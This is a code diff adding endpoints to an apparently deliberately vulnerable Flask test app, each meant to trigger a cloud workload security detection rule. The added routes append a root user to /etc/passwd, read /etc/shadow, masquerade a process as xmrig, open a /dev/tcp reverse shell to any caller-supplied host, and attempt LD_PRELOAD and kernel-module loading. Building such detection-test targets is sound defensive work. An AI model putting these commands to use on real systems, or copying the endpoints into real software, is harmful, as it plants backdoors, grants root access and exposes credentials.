@@ -338,6 +338,87 @@ def vuln_cmd():
     return jsonify(stdout=result.stdout, stderr=result.stderr, returncode=result.returncode)
 
 
+@app.route('/vuln/cws/passwd-write')
+def vuln_cws_passwd_write():
+    """Triggers CWS rule: modification of /etc/passwd / sensitive file."""
+    if not ENABLE_VULN_ENDPOINTS:
+        return jsonify(error='vuln endpoints disabled'), 404
+    import subprocess
+    subprocess.run('echo "hacker:x:0:0::/root:/bin/sh" >> /etc/passwd', shell=True)
+    return jsonify(ok=True, action='appended to /etc/passwd')
+
+
+@app.route('/vuln/cws/spawn-shell')
+def vuln_cws_spawn_shell():
+    """Triggers CWS rule: interactive shell spawned inside container."""
+    if not ENABLE_VULN_ENDPOINTS:
+        return jsonify(error='vuln endpoints disabled'), 404
+    import subprocess
+    out = subprocess.run(['/bin/sh', '-c', 'id && whoami && uname -a'],
+                         capture_output=True, text=True, timeout=5)
+    return jsonify(stdout=out.stdout)
+
+
+@app.route('/vuln/cws/discovery')
+def vuln_cws_discovery():
+    """Triggers CWS rules: recon/discovery commands chained."""
+    if not ENABLE_VULN_ENDPOINTS:
+        return jsonify(error='vuln endpoints disabled'), 404
+    import subprocess
+    cmd = 'whoami; id; hostname; uname -a; cat /etc/shadow 2>&1 | head; ip a; netstat -an 2>&1 | head'
+    out = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
+    return jsonify(stdout=out.stdout, stderr=out.stderr)
+
+
+@app.route('/vuln/cws/crypto-miner')
+def vuln_cws_crypto_miner():
+    """Triggers CWS rule: process name matches known crypto-miner pattern."""
+    if not ENABLE_VULN_ENDPOINTS:
+        return jsonify(error='vuln endpoints disabled'), 404
+    import subprocess
+    # Spawn a short-lived process renamed to xmrig — CWS matches on argv[0].
+    proc = subprocess.Popen(['/bin/sh', '-c', 'exec -a xmrig sleep 30'])
+    return jsonify(pid=proc.pid, name='xmrig')
+
+
+@app.route('/vuln/cws/reverse-shell')
+def vuln_cws_reverse_shell():
+    """Triggers CWS rule: outbound connection then shell exec — reverse shell.
+    Example: /vuln/cws/reverse-shell?host=attacker.example.com&port=4444
+    Will fail to actually connect without a listener, but the syscall pattern is enough.
+    """
+    if not ENABLE_VULN_ENDPOINTS:
+        return jsonify(error='vuln endpoints disabled'), 404
+    import subprocess
+    host = request.args.get('host', '127.0.0.1')
+    port = request.args.get('port', '4444')
+    cmd = (f'sh -i 5<> /dev/tcp/{host}/{port} 0<&5 1>&5 2>&5 &')
+    subprocess.run(cmd, shell=True, capture_output=True, timeout=3)
+    return jsonify(attempted=True, host=host, port=port)
+
+
+@app.route('/vuln/cws/ld-preload')
+def vuln_cws_ld_preload():
+    """Triggers CWS rule: LD_PRELOAD set to user-writable path."""
+    if not ENABLE_VULN_ENDPOINTS:
+        return jsonify(error='vuln endpoints disabled'), 404
+    import subprocess
+    out = subprocess.run(['/bin/sh', '-c', 'LD_PRELOAD=/tmp/evil.so id'],
+                         capture_output=True, text=True, timeout=5)
+    return jsonify(stdout=out.stdout, stderr=out.stderr)
+
+
+@app.route('/vuln/cws/kernel-module')
+def vuln_cws_kernel_module():
+    """Triggers CWS rule: kernel module manipulation attempt."""
+    if not ENABLE_VULN_ENDPOINTS:
+        return jsonify(error='vuln endpoints disabled'), 404
+    import subprocess
+    out = subprocess.run(['/bin/sh', '-c', 'lsmod; insmod /tmp/evil.ko 2>&1; modprobe evil 2>&1'],
+                         capture_output=True, text=True, timeout=5)
+    return jsonify(stdout=out.stdout, stderr=out.stderr)
+
+
 @app.route('/vuln/ssrf')
 def vuln_ssrf():
     """Server-Side Request Forgery — fetches arbitrary URL server-side.
